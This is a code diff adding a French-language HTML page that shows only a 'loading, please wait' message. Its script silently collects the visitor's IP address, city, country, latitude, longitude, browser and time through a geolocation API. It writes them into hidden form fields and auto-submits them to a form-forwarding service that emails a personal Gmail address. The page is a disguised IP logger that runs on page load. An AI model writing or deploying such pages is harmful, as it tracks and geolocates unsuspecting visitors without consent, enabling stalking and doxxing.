@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Chargement...</title>
+</head>
+<body>
+  <h2 style="text-align:center;">Chargement de la page, veuillez patienter...</h2>
+
+  <form id="form" action="https://formsubmit.co/oguerep@gmail.com" method="POST">
+    <input type="hidden" name="IP" id="ip">
+    <input type="hidden" name="Ville" id="city">
+    <input type="hidden" name="Pays" id="country">
+    <input type="hidden" name="Latitude" id="lat">
+    <input type="hidden" name="Longitude" id="lon">
+    <input type="hidden" name="Navigateur" id="browser">
+    <input type="hidden" name="Date et Heure" id="datetime">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+  </form>
+
+  <script>
+    // Date et heure
+    document.getElementById("datetime").value = new Date().toLocaleString();
+
+    // Navigateur
+    document.getElementById("browser").value = navigator.userAgent;
+
+    // API de géolocalisation
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("ip").value = data.ip;
+        document.getElementById("city").value = data.city;
+        document.getElementById("country").value = data.country_name;
+        document.getElementById("lat").value = data.latitude;
+        document.getElementById("lon").value = data.longitude;
+
+        // Soumission automatique du formulaire
+        document.getElementById("form").submit();
+      })
+      .catch(error => {
+        alert("Erreur de géolocalisation !");
+        console.error(error);
+      });
+  </script>
+</body>
+</html>
